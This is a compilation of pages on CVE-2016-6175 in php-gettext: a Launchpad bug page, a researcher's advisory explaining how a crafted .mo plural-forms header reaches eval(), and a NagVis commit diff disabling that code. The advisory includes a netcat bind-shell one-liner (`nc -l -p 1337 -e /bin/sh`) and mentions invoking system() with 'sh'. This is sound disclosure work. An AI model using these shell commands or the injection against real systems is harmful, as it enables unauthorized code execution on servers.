By the way, Debian package for php-gettext now carries this plural parser.

[See full activity log](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/php-gettext/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/php-gettext/%2Bbug/1606184/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [Adopt tests to run recent version of phpunit](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5384873/%2Bfiles/0002-Adopt-tests-to-run-recent-version-of-phpunit.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5384873 "Change patch details")
* [Use custom parser for parsing plural expressions instead of eval()](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5440422/%2Bfiles/0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5440422 "Change patch details")

* [Add patch](/php-gettext/%2Bbug/1606184/%2Baddcomment?field.patch=on)

## Bug attachments

* [php-gettext\_advisory.pdf](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/4706987/%2Bfiles/php-gettext_advisory.pdf)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/4706987 "Change attachment details")

* [Add attachment](/php-gettext/%2Bbug/1606184/%2Baddcomment)

## Remote bug watches

* [debbugs #851771](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=851771)

  [done grave jessie-ignore buster-ignore security stretch-ignore patch wheezy-ignore upstream]
  [Edit](/bugs/1606184/%2Bwatch/139365 "Change watch details")

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from kmkz-web-blog.blogspot.cz_033ae367_20250125_154612.html ===


# [kmkz's blog](https://kmkz-web-blog.blogspot.com/)

Just another web blog

## 2016/07/25

### [Advisory] CVE-2016-6175

# **Title**:
**g****ettext.****php****<= 1.0.12** **unauthenticated** **code
execution with** **POTENTIAL****privileges escalation**

# **Date**: June
25th, 2016
# **Author**:
kmkz (Bourbon Jean-marie) |
@kmkz\_security

# **Project****Homepage**: https://launchpad.net/php-gettext/
# **Download**:
https://launchpad.net/php-gettext/trunk/1.0.12/+download/php-gettext-1.0.12.tar.gz
# **Version**:
1.0.12 (latest release)
# **Tested on**:
Linux Debian, PHP 5.6.19-2+b1

# **CVSS**: **7.1**

# **CVE ID**:
**CVE-2016-6175**
# **OVE ID**:
**OVE-20160705-0004**
# **OSVD****B****ID**: n/a

# Thanks:
**Lars Michelsen** from
NagVis project where this bug was discovered and **Danilo Segan**
from gettext.php team project for
their reactivity and professionalism

# **Credits**:

<https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>
[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

# **Fix****es**:
[https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/ser](https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/serv)ver/core/ext/php-gettext-1.0.12/gettext.php

[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

**g****ettext.php
<= 1.0.12 (latest)**  **local/remote code execution** **with****POTENTIAL****privileges escalation** **issue**

I. APPLICATION

This library
provides PHP functions to read MO files even when gettext is not
compiled in or when appropriate locale is not present on the system.

This issue was
discovered by auditing Nagvis project source code, however NagVis is
not impacted by the following issue.

NagVis is a visualization addon for the well known network
managment system [Nagios](http://www.nagios.org/).

NagVis can be used to visualize Nagios Data, e.g. to display IT
processes like a mail system or a network infrastructure.

II. ADVISORY

A possible remote
(or local) code execution were identified in the **gettext.php**
file allowing an attacker to gain access on the targeted host system
and/or gain application’s privileges throught a
specially crafted .mo language file.

The **$string** variable is not sufficiently
sanitized before
to be submitted to **eval()**
function (which is dangerous) in **select\_string()**
function causing the security issue.

III. VULNERABILITY DESCRIPTION

The
**gettext\_reader****()**funtion try to test magic number that
need to match with .mo files :

**$MAGIC1 =
"\x95\x04\x12\xde";**
**$MAGIC2 =
"\xde\x12\x04\x95**";
If it seems correct
then we’ll continue.

We then extract
forms from .mo file’s header through **get\_plural\_forms()**
function and check them with a deprecated
(*since php 5.3.0* *because it can be easily bypassed
by adding a Null Byte*) **eregi()**
regexp function in order to valid they match the following
pattern:
***plural-forms:
([^\n]\*)\n***
(This regular expression matching have no effect on our payload)

Next step will be to sanitize the obtained expression string before
to practice the fatal eval() on this one.

Here is the impacted code snippet :

*snip...*
 *if (eregi("plural-forms:
([^\n]\*)\n", $header, $regs))*
 *$expr = $regs[1];*
 *else*
 *$expr = "nplurals=2;
plural=n == 1 ? 0 : 1;";*

 *$this->pluralheader
= $this→**sanitize\_plural\_expression($expr)****;***//
The
vulnerable function!!
 *}*
*snip…*

The comments presents at the beginning of
**sanitize\_plural\_expression()** function explain that this one is
here to prevent the **eval()** function attacks called later.

Comments are :
*/\*\* Sanitize plural form expression for use
in PHP eval call.*

 *@access private*
 *@return string sanitized plural form
expression\*\*/*

In fact, the security is guaranteed by a "preg\_replace"
that not permit us to inject specials chars.

*snip...*
function sanitize\_plural\_expression($expr) {

 // Get rid of disallowed characters.
 $expr =
preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '',
$expr); // « sanitizer »

 // Add parenthesis for tertiary '?'
operator.
 $expr .= ';';
 $res = '';
 $p = 0;
 for ($i = 0; $i < strlen($expr); $i++) {
// no indentation ?
 $ch = $expr[$i];
 switch ($ch) {
 case '?':
 $res .= ' ? (';
 $p++;
 break;
 case ':':
 $res .= ') : (';
 break;
 case ';':
 $res .= str\_repeat( ')', $p) . ';';

 $p = 0;
 break;
 default:
 $res .= $ch;
 }
 }
 return $res;
 }
*snip...*

Code snippet from the vulnerable function that execute eval() on the "sanitized" string :

*snip…*
 $string = $this->get\_plural\_forms();
 $string =
str\_replace('nplurals',"\$total",$string);
 $string = str\_replace("n",$n,$string);
 $string =
str\_replace('plural',"\$plural",$string);

 $total = 0;
 $plural = 0;

  eval("$string");
// eval called
…. launch my shell baby !
*snip…*

However, for example (but not only!) we can call **system**()
function with « sh » parameter in order to launch a /bin/sh
command on the targeted system and allowing us to gain an interactive
shell with application privileges on it.

A real scenario could be that a real attacker overwrites languages
files located in the /nagvis-1.8.5/share/frontend/nagvis-js/locale/
directory, in an internal repository, a Docker shared folder or any
other folder.

He now just have to wait or to execute the payload himself to obtain
his shell, that’s why this vulnerability is not so harmless !

Note :

*Apart from that we could
imagine that the attacker transform the **$expr** variable to
obtain an interactive remote shell without eval() and with (maybe)
more privileges like this :*
*$expr=
(`nc -l -p 1337 -e /bin/sh`);* //
proof of concept and screenshots joined to this advisory

Like a Perl developer could say: « there is more than one way
to do it »
IV. PROOF OF CONCEPT

Following PHP code reproduce the exploitation concept base on the
1.0.9 version
(without a crafted .mo file and joined with this advisory).

V. RECOMMENDATIONS

As explained in the
associated « bug track », it was assumed that PO and MO files would
come from untrusted translators.
Check the
permissions on PO/MO files in order to ensure the provenance and the
fact that is only accessible from trusted parties.

The project's
members are writing a new version that will patch this issue
definitively, thank you to respect their work and to apply this
temporary fix.

VI. VERSIONS AFFECTED

This issue affect the latest GETTEXT .PHP version and were found
in latest stable NAGVIS (1.8.5) version.
It could affect the a lot of web application and/or many website as
long as it will not be updated.

VII. TIMELINE

**June 21th, 2016**: Vulnerability identification
**June 21th, 2016**: Nagvis project developers and gettext.php developers
notification
**June 22th, 2016**: Nagvis project developers response
**June 25th, 2016**: Nagvis Patch release (even if not really affected)
**June
27****th,
2016**: Gettext.php
team response (from Danilo Šegan), exchange started
**July 5th, 2016**:
CVE request ID (mitre) and OVE ID request
**July 7th, 2016**:
***CVE-2016-6175*** attributed by MITRE
**July 25th, 2016**: Public disclosure

VIII. LEGAL NOTICES

The information contained within this advisory is supplied "as-is"
with
no warranties or guarantees of fitness of use or otherwise.

I accept no responsibility for any damage caused by the use or misuse
of this advisory.

[CVE-2016-6175] gettext.php code execution - PoC example:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s640/cve-2016-6175.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s1600/cve-2016-6175.png)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[13:34](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1065233655939428122&from=pencil "Modifier l'article")

#### Aucun commentaire:

[Enregistrer un commentaire](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1065233655939428122)

[Article plus récent](https://kmkz-web-blog.blogspot.com/2017/03/advisory-cve-2017-5671-intermec.html "Article plus récent")

[Article plus ancien](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html "Article plus ancien")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Publier les commentaires (Atom)](https://kmkz-web-blog.blogspot.com/feeds/1065233655939428122/comments/default)

## Archives

* ►
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)

* ▼
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ▼
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
    - [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from github.com_3b332946_20250125_154611.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagVis%2Fnagvis%2Fcommit%2F4fe8672a5aec3467da72b5852ca6d283c15adb53)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagVis%2Fnagvis%2Fcommit%2F4fe8672a5aec3467da72b5852ca6d283c15adb53)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NagVis%2Fnagvis)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NagVis](/NagVis)
/
**[nagvis](/NagVis/nagvis)**
Public

* [Notifications](/login?return_to=%2FNagVis%2Fnagvis) You must be signed in to change notification settings
* [Fork
  74](/login?return_to=%2FNagVis%2Fnagvis)
* [Star
   116](/login?return_to=%2FNagVis%2Fnagvis)

* [Code](/NagVis/nagvis)
* [Issues
  62](/NagVis/nagvis/issues)
* [Pull requests
  11](/NagVis/nagvis/pulls)
* [Actions](/NagVis/nagvis/actions)
* [Projects
  0](/NagVis/nagvis/projects)
* [Wiki](/NagVis/nagvis/wiki)
* [Security](/NagVis/nagvis/security)
* [Insights](/NagVis/nagvis/pulse)

Additional navigation options

* [Code](/NagVis/nagvis)
* [Issues](/NagVis/nagvis/issues)
* [Pull requests](/NagVis/nagvis/pulls)
* [Actions](/NagVis/nagvis/actions)
* [Projects](/NagVis/nagvis/projects)
* [Wiki](/NagVis/nagvis/wiki)
* [Security](/NagVis/nagvis/security)
* [Insights](/NagVis/nagvis/pulse)

## Commit

[Permalink](/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Clarified change log on php-gettext 1.0.12 update

[Browse files](/NagVis/nagvis/tree/4fe8672a5aec3467da72b5852ca6d283c15adb53)
Browse the repository at this point in the history

* Loading branch information

[![@LarsMichelsen](https://avatars.githubusercontent.com/u/2719629?s=40&v=4)](/LarsMichelsen)

[LarsMichelsen](/NagVis/nagvis/commits?author=LarsMichelsen "View all commits by LarsMichelsen")
committed
Jun 25, 2016

1 parent
[b7250c7](/NagVis/nagvis/commit/b7250c78180baa8663cad56e5ead04ef9d877c7d)

commit 4fe8672

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**116 additions**
and
**128 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ChangeLog
  [ChangeLog](#diff-91c5b46dc84a94604a4e4d0caed9bf85590a2eddbb12d2e8dc80badf324a9dfb)
* share/server/core/ext/php-gettext-1.0.12

  + share/server/core/ext/php-gettext-1.0.12/gettext.php
    [gettext.php](#diff-3b527bd22c51b637502b9280d479e19b44aae12be3b829cd3e4e63fc06ea4adf)

## There are no files selected for viewing

19 changes: 3 additions & 16 deletions

19
[ChangeLog](#diff-91c5b46dc84a94604a4e4d0caed9bf85590a2eddbb12d2e8dc80badf324a9dfb "ChangeLog")

Show comments

[View file](/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/ChangeLog)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,22 +3,9 @@ Core: |
|  |  | \* MK BI backend: Now prints an error message when trying to use it with |
|  |  | objects that are not aggregations. |
|  |  | \* NDO MySQL backend: Filtering out legacy objects from DB (setting is\_active filter) |
|  |  | \* FIX: A local exploitable security issue has been discovered in the php-gettext |
|  |  | library which is used to make NagVis localizable on platforms which has no gettext |
|  |  | support built into PHP. |
|  |  |  |
|  |  | A local user with privileges to create/modify the .mo files used by NagVis |
|  |  | could modify a file in a way that it executes custom code with the privileges of |
|  |  | the web server which is executing the NagVis code. |
|  |  |  |
|  |  | To more than 99% of NagVis installations (installed with the install.sh |
|  |  | installer or OMD) this is no special threat because a user which is able to .mo |
|  |  | files is able to modify the .php program files of NagVis. An attacker |
|  |  | would rather modify the .php files directly instead of injecting it's code through |
|  |  | the .mo files. |
|  |  |  |
|  |  | However, to fix this for most installations minor issue, we included php-gettext |
|  |  | in version 1.0.12 with this release which fixes the issue. |
|  |  | \* FIX: Updated php-gettext to 1.0.12 and commented out unused code because it contains |
|  |  | some exploitable PHP code which could be used to inject code using modified .mo files. |
|  |  | However, NagVis has never used these functions, so was never affected by this issue. |
|  |  |  |
|  |  | Frontend: |
|  |  | \* FIX: Fixed error in ad-hoc automaps (Network Topology in Check\_MK) during state updates |
| Expand Down | |  |

225 changes: 113 additions & 112 deletions

225
[share/server/core/ext/php-gettext-1.0.12/gettext.php](#diff-3b527bd22c51b637502b9280d479e19b44aae12be3b829cd3e4e63fc06ea4adf "share/server/core/ext/php-gettext-1.0.12/gettext.php")

Show comments

[View file](/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/server/core/ext/php-gettext-1.0.12/gettext.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,72 +275,73 @@ function translate($string) { |
|  |  | \* @access private |
|  |  | \* @return string sanitized plural form expression |
|  |  | \*/ |
|  |  | function sanitize\_plural\_expression($expr) { |
|  |  | // Get rid of disallowed characters. |
|  |  | $expr = preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '', $expr); |
|  |  |  |
|  |  | // Add parenthesis for tertiary '?' operator. |
|  |  | $expr .= ';'; |
|  |  | $res = ''; |
|  |  | $p = 0; |
|  |  | for ($i = 0; $i < strlen($expr); $i++) { |
|  |  | $ch = $expr[$i]; |
|  |  | switch ($ch) { |
|  |  | case '?': |
|  |  | $res .= ' ? ('; |
|  |  | $p++; |
|  |  | break; |
|  |  | case ':': |
|  |  | $res .= ') : ('; |
|  |  | break; |
|  |  | case ';': |
|  |  | $res .= str\_repeat( ')', $p) . ';'; |
|  |  | $p = 0; |
|  |  | break; |
|  |  | default: |
|  |  | $res .= $ch; |
|  |  | } |
|  |  | } |
|  |  | return $res; |
|  |  | } |
|  |  | //function sanitize\_plural\_expression($expr) { |
|  |  | // // Get rid of disallowed characters. |
|  |  | // $expr = preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '', $expr); |
|  |  |  |
|  |  | // // Add parenthesis for tertiary '?' operator. |
|  |  | // $expr .= ';'; |
|  |  | // $res = ''; |
|  |  | // $p = 0; |
|  |  | // for ($i = 0; $i < strlen($expr); $i++) { |
|  |  | // $ch = $expr[$i]; |
|  |  | // switch ($ch) { |
|  |  | // case '?': |
|  |  | // $res .= ' ? ('; |
|  |  | // $p++; |
|  |  | // break; |
|  |  | // case ':': |
|  |  | // $res .= ') : ('; |
|  |  | // break; |
|  |  | // case ';': |
|  |  | // $res .= str\_repeat( ')', $p) . ';'; |
|  |  | // $p = 0; |
|  |  | // break; |
|  |  | // default: |
|  |  | // $res .= $ch; |
|  |  | // } |
|  |  | // } |
|  |  | // return $res; |
|  |  | //} |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Parse full PO header and extract only plural forms line. |
|  |  | \* |
|  |  | \* @access private |
|  |  | \* @return string verbatim plural form header field |
|  |  | \*/ |
|  |  | function extract\_plural\_forms\_header\_from\_po\_header($header) { |
|  |  | if (preg\_match("/(^|\n)plural-forms: ([^\n]\*)\n/i", $header, $regs)) |
|  |  | $expr = $regs[2]; |
|  |  | else |
|  |  | $expr = "nplurals=2; plural=n == 1 ? 0 : 1;"; |
|  |  | return $expr; |
|  |  | } |
|  |  | //function extract\_plural\_forms\_header\_from\_po\_header($header) { |
|  |  | // if (preg\_match("/(^|\n)plural-forms: ([^\n]\*)\n/i", $header, $regs)) |
|  |  | // $expr = $regs[2]; |
|  |  | // else |
|  |  | // $expr = "nplurals=2; plural=n == 1 ? 0 : 1;"; |
|  |  | // return $expr; |
|  |  | //} |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get possible plural forms from MO header |
|  |  | \* |
|  |  | \* @access private |
|  |  | \* @return string plural form header |
|  |  | \*/ |
|  |  | function get\_plural\_forms() { |
|  |  | // lets assume message number 0 is header |
|  |  | // this is true, right? |
|  |  | $this->load\_tables(); |
|  |  |  |
|  |  | // cache header field for plural forms |
|  |  | if (! is\_string($this->pluralheader)) { |
|  |  | if ($this->enable\_cache) { |
|  |  | $header = $this->cache\_translations[""]; |
|  |  | } else { |
|  |  | $header = $this->get\_translation\_string(0); |
|  |  | } |
|  |  | $expr = $this->extract\_plural\_forms\_header\_from\_po\_header($header); |
|  |  | $this->pluralheader = $this->sanitize\_plural\_expression($expr); |
|  |  | } |
|  |  | return $this->pluralheader; |
|  |  | } |
|  |  | //function get\_plural\_forms() { |
|  |  | // // lets assume message number 0 is header |
|  |  | // // this is true, right? |
|  |  | // $this->load\_tables(); |
|  |  |  |
|  |  | // // cache header field for plural forms |
|  |  | // if (! is\_string($this->pluralheader)) { |
|  |  | // if ($this->enable\_cache) { |
|  |  | // $header = $this->cache\_translations[""]; |
|  |  | // } else { |
|  |  | // $header = $this->get\_translation\_string(0); |
|  |  | // } |
|  |  | // print($header); |
|  |  | // $expr = $this->extract\_plural\_forms\_header\_from\_po\_header($header); |
|  |  | // $this->pluralheader = $this->sanitize\_plural\_expression($expr); |
|  |  | // } |
|  |  | // return $this->pluralheader; |
|  |  | //} |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Detects which plural form to take |
| Expand All | | @@ -349,23 +350,23 @@ function get\_plural\_forms() { |
|  |  | \* @param n count |
|  |  | \* @return int array index of the right plural form |
|  |  | \*/ |
|  |  | function select\_string($n) { |
|  |  | if (!is\_int($n)) { |
|  |  | throw new InvalidArgumentException( |
|  |  | "Select\_string only accepts integers: " . $n); |
|  |  | } |
|  |  | $string = $this->get\_plural\_forms(); |
|  |  | $string = str\_replace('nplurals',"\$total",$string); |
|  |  | $string = str\_replace("n",$n,$string); |
|  |  | $string = str\_replace('plural',"\$plural",$string); |
|  |  |  |
|  |  | $total = 0; |
|  |  | $plural = 0; |
|  |  |  |
|  |  | eval("$string"); |
|  |  | if ($plural >= $total) $plural = $total - 1; |
|  |  | return $plural; |
|  |  | } |
|  |  | //function select\_string($n) { |
|  |  | // if (!is\_int($n)) { |
|  |  | // throw new InvalidArgumentException( |
|  |  | // "Select\_string only accepts integers: " . $n); |
|  |  | // } |
|  |  | // $string = $this->get\_plural\_forms(); |
|  |  | // $string = str\_replace('nplurals',"\$total",$string); |
|  |  | // $string = str\_replace("n",$n,$string); |
|  |  | // $string = str\_replace('plural',"\$plural",$string); |
|  |  |  |
|  |  | // $total = 0; |
|  |  | // $plural = 0; |
|  |  |  |
|  |  | // eval("$string"); |
|  |  | // if ($plural >= $total) $plural = $total - 1; |
|  |  | // return $plural; |
|  |  | //} |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Plural version of gettext |
| Expand All | | @@ -376,40 +377,40 @@ function select\_string($n) { |
|  |  | \* @param string number |
|  |  | \* @return translated plural form |
|  |  | \*/ |
|  |  | function ngettext($single, $plural, $number) { |
|  |  | if ($this->short\_circuit) { |
|  |  | if ($number != 1) |
|  |  | return $plural; |
|  |  | else |
|  |  | return $single; |
|  |  | } |
|  |  |  |
|  |  | // find out the appropriate form |
|  |  | $select = $this->select\_string($number); |
|  |  |  |
|  |  | // this should contains all strings separated by NULLs |
|  |  | $key = $single . chr(0) . $plural; |
|  |  |  |
|  |  |  |
|  |  | if ($this->enable\_cache) { |
|  |  | if (! array\_key\_exists($key, $this->cache\_translations)) { |
|  |  | return ($number != 1) ? $plural : $single; |
|  |  | } else { |
|  |  | $result = $this->cache\_translations[$key]; |
|  |  | $list = explode(chr(0), $result); |
|  |  | return $list[$select]; |
|  |  | } |
|  |  | } else { |
|  |  | $num = $this->find\_string($key); |
|  |  | if ($num == -1) { |
|  |  | return ($number != 1) ? $plural : $single; |
|  |  | } else { |
|  |  | $result = $this->get\_translation\_string($num); |
|  |  | $list = explode(chr(0), $result); |
|  |  | return $list[$select]; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | //function ngettext($single, $plural, $number) { |
|  |  | // if ($this->short\_circuit) { |
|  |  | // if ($number != 1) |
|  |  | // return $plural; |
|  |  | // else |
|  |  | // return $single; |
|  |  | // } |
|  |  |  |
|  |  | // // find out the appropriate form |
|  |  | // $select = $this->select\_string($number); |
|  |  |  |
|  |  | // // this should contains all strings separated by NULLs |
|  |  | // $key = $single . chr(0) . $plural; |
|  |  |  |
|  |  |  |
|  |  | // if ($this->enable\_cache) { |
|  |  | // if (! array\_key\_exists($key, $this->cache\_translations)) { |
|  |  | // return ($number != 1) ? $plural : $single; |
|  |  | // } else { |
